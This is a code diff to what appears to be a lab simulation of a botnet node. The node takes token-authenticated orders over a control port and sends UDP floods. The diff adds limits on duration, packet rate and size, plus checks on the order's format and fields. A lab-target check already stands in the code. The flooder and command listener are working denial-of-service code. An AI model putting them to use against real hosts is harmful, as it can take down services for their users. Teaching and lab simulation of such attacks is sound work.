@@ -21,7 +21,10 @@ import socket
 import threading
 import time
 
-from common import CONTROL_PORT, CAMPAIGN_TOKEN, is_lab_target
+from common import (
+    CONTROL_PORT, CAMPAIGN_TOKEN, is_lab_target, clamp,
+    MAX_DURATION, MAX_PPS, MAX_SIZE,
+)
 
 
 class Attacker:
@@ -39,6 +42,10 @@ class Attacker:
         if self.is_running():
             print(f"[{self.zombie_id}] Ya hay un ataque en curso; ignoro la nueva orden.")
             return
+        # Acotamos la carga: la simulacion nunca es un flood sin limites.
+        duration = clamp(duration, 1, MAX_DURATION)
+        pps = clamp(pps, 1, MAX_PPS)
+        size = clamp(size, 1, MAX_SIZE)
         self._stop.clear()
         self._thread = threading.Thread(
             target=self._run, args=(target_ip, target_port, duration, pps, size), daemon=True
@@ -48,7 +55,7 @@ class Attacker:
     def _run(self, target_ip: str, target_port: int, duration: int, pps: int, size: int):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         payload = b"X" * max(1, size)
-        interval = 1.0 / pps if pps > 0 else 0  # control de ritmo sencillo
+        interval = 1.0 / max(1, pps)  # control de ritmo; pps siempre >= 1 (acotado)
         sent = 0
         start = time.time()
         deadline = start + duration
@@ -93,6 +100,9 @@ def listen(zombie_id: str, control_port: int):
             except (ValueError, UnicodeDecodeError):
                 continue
 
+            # El JSON debe ser un objeto; un numero, lista o string valido no vale.
+            if not isinstance(order, dict):
+                continue
             if order.get("token") != CAMPAIGN_TOKEN:
                 continue
             if order.get("cmd") != "attack":
@@ -103,14 +113,22 @@ def listen(zombie_id: str, control_port: int):
                 print(f"[{zombie_id}] Orden rechazada: {target_ip} no es objetivo de laboratorio.")
                 continue
 
+            # Campos numericos tolerantes a basura: si no son enteros, descartamos la orden.
+            try:
+                target_port = int(order.get("target_port", 0))
+                duration = int(order.get("duration", 10))
+                pps = int(order.get("pps", 2000))
+                size = int(order.get("size", 512))
+            except (TypeError, ValueError):
+                print(f"[{zombie_id}] Orden descartada: parametros numericos invalidos.")
+                continue
+
+            if not (0 < target_port < 65536):
+                print(f"[{zombie_id}] Orden descartada: puerto invalido ({target_port}).")
+                continue
+
             print(f"[{zombie_id}] Orden recibida de {addr[0]}.")
-            attacker.start(
-                target_ip,
-                int(order.get("target_port", 0)),
-                int(order.get("duration", 10)),
-                int(order.get("pps", 2000)),
-                int(order.get("size", 512)),
-            )
+            attacker.start(target_ip, target_port, duration, pps, size)
     except KeyboardInterrupt:
         print(f"\n[{zombie_id}] Saliendo.")
     finally:
